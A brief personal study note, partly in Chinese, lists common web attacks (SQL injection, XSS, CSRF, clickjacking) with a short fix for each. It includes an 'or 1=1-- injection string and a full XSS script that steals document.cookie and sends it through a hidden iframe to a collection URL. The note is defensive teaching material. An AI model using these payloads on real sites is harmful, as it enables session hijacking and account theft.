
### web site security

1. sql inject
```
攻击实例： 'or 1=1--
改正方法： sql使用参数化, 不拼sql
```

2. xss cross site scripting

```
攻击实例： 攻击者通常会在有漏洞的程序中插入JavaScript、VBScript、ActiveX或Flash以欺骗用户。一旦得手，他们可以盗取用户帐户信息，修改用户设置，盗取/污染cookie和植入恶意广告等。用 

<script type="text/javascript"> 
(function(window, document) {
    // 构造泄露信息用的 URL
    var cookies = document.cookie;
    console.log("cookes: " + cookies);
    var xssURIBase = "http://localhost:9000/v2/xss?cookie=";
    var xssURI = xssURIBase + window.encodeURI(cookies);
    // 建立隐藏 iframe 用于通讯
    var hideFrame = document.createElement("iframe");
    hideFrame.height = 0;
    hideFrame.width = 0;
    hideFrame.style.display = "none";
    hideFrame.src = xssURI;
    // 开工
    document.body.appendChild(hideFrame);
})(window, document);
</script>

改正方法：escape input
```
3. csrf Cross-site request forgery

```
攻击实例：  http:xxx.com/posts?title=1212&content=345345
1. 正确使用http method, get , post, put, delete, options, head, patch, trace, connect

攻击实例： http post  register
改正方法： 1. 验证码 2. csrf token 3. 关键业务重复数据密码

ajax: 跨域开放时，给出有限访问的白名单
改正方法： 给出有限访问的白名单


```
4. x-frame cfs

```
Using X-Frame-Options
DENY
The page cannot be displayed in a frame, regardless of the site attempting to do
so.
SAMEORIGIN
The page can only be displayed in a frame on the same origin as the page itself.
ALLOW-FROM uri
The page can only be displayed in a frame on the specified origin.

Nginx config 
add_header X-Frame-Options SAMEORIGIN;
```

7. Ddos

### 加强安全
5. cookie
```
加密
```

8. 使用https

9. 密码

```
密码加密
```

10. 重复提交

```
1. 重复提交form 表单  使用token
```

